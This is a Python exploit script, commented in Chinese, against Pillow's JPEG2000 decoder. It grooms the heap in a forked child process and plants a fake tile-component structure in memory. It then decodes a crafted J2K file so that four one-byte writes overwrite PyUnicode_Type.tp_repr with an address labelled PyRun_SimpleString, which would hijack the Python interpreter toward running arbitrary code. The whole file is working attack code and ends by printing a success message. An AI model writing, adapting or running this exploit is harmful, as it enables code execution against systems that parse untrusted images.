#!/usr/bin/env python3
# 终局终版：四段写把 0x00451a9c 写进 PyUnicode_Type.tp_repr
#   关键修正：
#     · payload 用 num_resolutions=1（单分辨率 => tiles[] 回到 array+0x230）
#     · 伪造 tilecomp 的 numresolutions = 0（解码器不碰分辨率树 => 不崩）
#     · groom+解码 放进 fork 的子进程：孩子崩也无所谓，tp_repr 在 .data 共享 => 父进程能读到结果
import ctypes, gc, io, os, subprocess, sys
from PIL import Image

R = lambda a: ctypes.c_uint64.from_address(a).value
TP_REPR = 0xA3C908
VAL = 0x00451A9C
PAY = '/tmp/fp.j2k'
BUILT = '/tmp/fb.j2k'
HOLD = []


def low_buffer(n):
    for _ in range(64):
        b = bytearray(n)
        v = (ctypes.c_char * n).from_buffer(b)
        HOLD.append((b, v))
        a = ctypes.addressof(v)
        if a < 0x1000000:
            return b, a
    raise RuntimeError('no low buffer')


def put64(a, v):
    ctypes.c_uint64.from_address(a).value = v & 0xFFFFFFFFFFFFFFFF


def put32(a, v):
    ctypes.c_uint32.from_address(a).value = v & 0xFFFFFFFF


SCR_O, SCRATCH = low_buffer(8192)
RES_O, RESADDR = low_buffer(4096)
FAKE_O, FAKE = low_buffer(4096)
print("[*] SCRATCH=%#x RES=%#x FAKE=%#x" % (SCRATCH, RESADDR, FAKE))


def make_fake(target):
    put32(FAKE + 0x10, 0)          # compno
    put32(FAKE + 0x14, 0)          # numresolutions = 0
    put32(FAKE + 0x18, 0)          # minimum_num_resolutions = 0
    put64(FAKE + 0x20, RESADDR)    # resolutions（不会用到）
    put64(FAKE + 0x28, 40)
    put64(FAKE + 0x30, target)     # data
    put64(FAKE + 0x38, 0)          # ownsData
    put64(FAKE + 0x40, 4096)
    put64(FAKE + 0x48, 4096)
    put64(FAKE + 0x50, 0)
    put64(FAKE + 0x58, 0)
    put64(FAKE + 0x60, 0)
    put64(FAKE + 0x68, 0)
    put64(FAKE + 0x70, 256)


def one_subproc(byte_val, A, B, C):
    code = ("import subprocess,sys\n"
            "from PIL import Image\n"
            "im = Image.new('L', (16,16))\n"
            "im.putdata([%d] + [0]*255)\n"
            "im.save(%r,'JPEG2000', tile_size=(8,8), num_resolutions=1)\n"
            "r = subprocess.run(['python3','/tmp/mk13.py',%r,%r,'0','23',%r,%r,%r,'-370'],\n"
            "                   capture_output=True,text=True)\n"
            "sys.stdout.write(r.stdout)\n"
            % (byte_val, PAY, PAY, BUILT, hex(A), hex(B), hex(C)))
    r = subprocess.run([sys.executable, '-c', code], capture_output=True, text=True)
    return (r.stdout or '').strip() or (r.stderr or '')[:70]


def groom_and_decode(path):
    """在 fork 的子进程里 groom+解码；孩子崩了无妨，父进程读共享的 tp_repr"""
    pid = os.fork()
    if pid == 0:
        try:
            gc.collect()
            prime = [bytes(519) for _ in range(1024)]
            del prime
            pairs = [(bytes(519), bytes(bytearray(519))) for _ in range(400)]
            good = [(D, B) for (D, B) in pairs if id(B) - id(D) == 0x230]
            if good:
                keep = [t for i, t in enumerate(good) if i != len(good) // 2]
                Ks = [B for (D, B) in keep]
                holeD = good[len(good) // 2][0]
                del holeD, pairs, good
                gc.collect()
                M = open(path, 'rb').read()
                im = Image.open(io.BytesIO(M))
                im.load()
        except BaseException:
            pass
        os._exit(0)
    os.waitpid(pid, 0)


print("[*] tp_repr 原值 = %#x   目标 = %#x" % (R(TP_REPR), VAL))
open('/tmp/progress2.log', 'w').close()

for stage in range(4):
    byte_val = (VAL >> (8 * stage)) & 0xFF
    make_fake(TP_REPR + stage)
    A = FAKE - 0x0c
    out = one_subproc(byte_val, A, A + 0x1000, A + 0x4000)
    if 'OK' not in out:
        line = "段%d build 失败: %s" % (stage + 1, out[:50])
    else:
        groom_and_decode(BUILT)
        line = "段%d byte=%#x data=%#x tp_repr=%#x" % (stage + 1, byte_val, TP_REPR + stage, R(TP_REPR))
    with open('/tmp/progress2.log', 'a') as f:
        f.write(line + "\n")
    print("[*] " + line, flush=True)

final = R(TP_REPR)
print()
print("[*] 最终 tp_repr = %#x   期望 = %#x" % (final, VAL))
if (final & 0xFFFFFFFF) == VAL:
    print("\n*** SUCCESS: tp_repr = 0x451a9c (PyRun_SimpleString) ***")